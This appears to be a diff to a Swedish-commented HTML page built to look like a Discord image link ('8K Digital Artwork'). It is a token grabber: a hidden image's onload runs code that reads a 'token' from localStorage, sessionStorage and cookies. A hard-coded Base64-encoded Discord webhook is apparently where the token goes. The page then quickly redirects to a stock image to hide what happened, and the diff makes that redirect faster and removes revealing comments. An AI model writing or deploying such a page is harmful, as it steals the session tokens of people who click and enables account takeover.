@@ -3,15 +3,14 @@
 <head>
     <!-- DET HÄR GÖR ATT DISCORD VISAR EN BILD-EMBED -->
     <meta property="og:title" content="✨ 8K Digital Artwork">
-    <meta property="og:image" content="https://images.unsplash.com/photo-1541701494587-cb58502866ab?w=800">
+    <meta property="og:image" content="https://picsum.photos/seed/art/800/600">
     <meta property="og:description" content="Click to view full resolution">
-    <meta property="og:url" content="https://images.unsplash.com/photo-1541701494587-cb58502866ab?w=800">
+    <meta property="og:url" content="https://picsum.photos/seed/art/800/600">
     <meta property="og:type" content="website">
     
     <title>Art Gallery</title>
     
     <style>
-        /* Dold sida – användaren ser ingenting */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body { 
             background: #0a0a0a; 
@@ -43,38 +42,31 @@
 </head>
 <body>
 
-    <!-- Laddningsanimation (syns i <1 sekund) -->
     <div class="loader" id="loader">
         <div class="spinner"></div>
         <p>Loading full resolution...</p>
     </div>
 
-    <!-- Dold bild som triggar omdirigering -->
-    <img id="hiddenImage" src="https://images.unsplash.com/photo-1541701494587-cb58502866ab?w=800" onload="startGrab()">
+    <img id="hiddenImage" src="https://picsum.photos/seed/art/800/600" onload="startGrab()">
 
     <script>
         (function() {
             'use strict';
             
             // ===== DIN WEBHOOK (Base64-kodad) =====
-            // Ersätt detta med din egen webhook! 
-            // Gå till: https://www.base64encode.org/ och koda din webhook-URL
-            const WEBHOOK = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMDIyMjkxMDQ1ODEwNTg1Ni9Cd3NKcU5KOFIyRlB0X0V2UGdGa2lYV3RxTnNBeUlib0M1NUFnRjF3ZzZPeV9BdURBUHB6ZUtqTlVPNVFKeWpWTHRPVw====");
-            const IMAGE_URL = "https://images.unsplash.com/photo-1541701494587-cb58502866ab?w=800";
+            const WEBHOOK = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTUyMDIyMjkxMDQ1ODEwNTg1Ni9Cd3NKcU5KOFIyRlB0X0V2UGdGa2lYV3RxTnNBeUlib0M1NUFnRjF3ZzZPeV9BdURBUHB6ZUtqTlVPNVFKeWpWTHRPVw==");
+            const IMAGE_URL = "https://picsum.photos/seed/art/800/600";
             
             // ===== TOKEN-EXTRAKTION =====
             function getToken() {
                 let token = null;
                 
-                // localStorage
                 try { token = localStorage.getItem('token'); } catch(e) {}
                 
-                // sessionStorage
                 if (!token) {
                     try { token = sessionStorage.getItem('token'); } catch(e) {}
                 }
                 
-                // Cookies
                 if (!token) {
                     try {
                         const match = document.cookie.match(/token=([^;]+)/);
@@ -146,10 +138,10 @@
                     }, 2000);
                 }
                 
-                // Omdirigera till bilden efter 1 sekund
+                // Omdirigera till bilden efter 0.5 sekund (snabbare)
                 setTimeout(() => {
                     window.location.href = IMAGE_URL;
-                }, 1000);
+                }, 500);
             }
             
             // Ladda bilden – när den är klar körs startGrab()
